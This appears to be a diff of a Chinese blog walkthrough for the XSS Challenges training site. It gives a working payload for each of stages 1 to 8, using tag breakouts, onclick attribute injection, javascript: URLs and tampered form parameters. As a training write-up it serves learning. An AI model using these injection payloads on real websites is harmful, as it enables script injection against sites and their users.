@@ -226,7 +226,7 @@
               <p>XSS Challenges Stage(<a href="http://xss-quiz.int21h.jp">http://xss-quiz.int21h.jp</a>) 上的练习题解。
     </p>
 
-<p>这是一个不错的入门xss的练习平台，每一关的目的是注入alert(document.domain)，成功xss后就会出现下一关的链接。
+<p>这是一个入门xss的练习平台，每一关的目的是注入alert(document.domain)，成功xss后就会出现下一关的链接。有些payload会被Chrome、Firefox等拦截，此时可换用IE浏览器。
 
 
   
@@ -256,32 +256,30 @@
           <tbody>
             <tr>
               <td class="gutter">
-                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></pre>
+                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></pre>
               </td>
               <td class="code">
                 <pre class="code-highlight language-"><code class="">0x01	
 	http://xss-quiz.int21h.jp
-	payload: 1&#34;&lt;/b&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;b&gt;1&#34;
+	payload:&#39; have&#34;&lt;/b&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;b&gt;1&#34; &#39;(单引号中的内容为payload)
 0x02 
 	http://xss-quiz.int21h.jp/stage2.php
-	payload：1&#34; /&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;&#34;
-	 
+	payload:&#39; a&#34; /&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;&#34; &#39;
 0x03 
 	http://xss-quiz.int21h.jp/stage-3.php
 	这里没法通过搜索框alert，不过可以抓包修改下拉框的内容，即参数p2的值，注意p1的值不能放
 	空，否则表单会无效。
 	下面是抓包方式的payload
-	payload：p1=12&amp;p2=Japan&lt;/b&gt;.&lt;hr class=red&gt;&lt;/form&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;hr class=red&gt;&lt;b&gt;
+	payload:&#39; p1=nice&amp;p2=Japan&lt;/b&gt;.&lt;hr class=red&gt;&lt;/form&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;hr class=red&gt;&lt;b&gt; &#39;
 0x04
 	http://xss-quiz.int21h.jp/stage_4.php
 	检查源码可以发现有个隐藏参数p3，默认值是&#39;hackme&#39;，可以通过这个参数alert
 	下面是抓包方式的payload
-	payload：p1=12&amp;p2=Japan&amp;p3=&#34; /&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;&#34;
-	 
+	payload:&#39; p1=day&amp;p2=Japan&amp;p3=&#34; /&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;&#34; &#39;
 0x05 
 	http://xss-quiz.int21h.jp/stage--5.php
-	payload：
-	 </code></pre>
+	检查元素可见搜索框限定了内容长度maxLength=&#34;15&#34;，改大点就好了，然后可以愉快的xss了。
+	payload:&#39; &#34; /&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;&#34; &#39;</code></pre>
               </td>
             </tr>
           </tbody>
@@ -289,7 +287,72 @@
       </figure>
     
   </div>
-</figure></p>
+</figure>
+
+
+  
+  
+  
+  
+  
+
+
+  
+  
+
+<figure class="codeblock codeblock--tabbed">
+  <figcaption>
+    
+    <ul class="tabs">
+      
+        <li class="tab active"></li>
+      
+    </ul>
+  </figcaption> 
+  <div class="tabs-content">
+    
+      
+      <figure class="highlight language-" style="display: block;">   
+        <table>
+          <tbody>
+            <tr>
+              <td class="gutter">
+                <pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></pre>
+              </td>
+              <td class="code">
+                <pre class="code-highlight language-"><code class="">0x06
+	http://xss-quiz.int21h.jp/stage-no6.php
+	payload:&#39; &#34; onclick=&#34;alert(document.domain) &#39;
+	然后点一下搜索框就好了。
+0x07 
+	http://xss-quiz.int21h.jp/stage07.php
+	用第六题的payload尝试发现点击无效，检查元素发现变成了这样：
+	&lt;input onclick=&#34;&#34;alert(document.domain)&#34; size=50 value=&#34;&#34;&#34; name=p1&gt;
+	我当时 ？？？，然后在资源管理器里手动删了onclick= 后面多的那个双引号，然后再点击搜索框就好了。
+	所以可以这样写
+	payload:&#39; &#34; onclick=alert(document.domain) &#39;
+	然后点一下搜索框。
+0x08 
+	http://xss-quiz.int21h.jp/stage008.php
+	payload:&#39; javascript:alert(document.domain) &#39;
+	javascript: 是一个伪协议，当触发标签默认行为时，执行一段js代码。
+	javascript:; 可以用来阻止标签a的默认行为
+	&lt;a href=&#34;javascript:;&#34;&gt;test&lt;/a&gt;
+	效果等同于
+	&lt;a href=&#34;#&#34;&gt;test&lt;/a&gt;
+	&lt;a href=&#34;javascript:void(0);&#34;&gt;test&lt;/a&gt;等
+0x09
+	http://xss-quiz.int21h.jp/stage_09.php
+	</code></pre>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </figure>
+    
+  </div>
+</figure>
+Loading……</p>
               
             </div>
           </div>
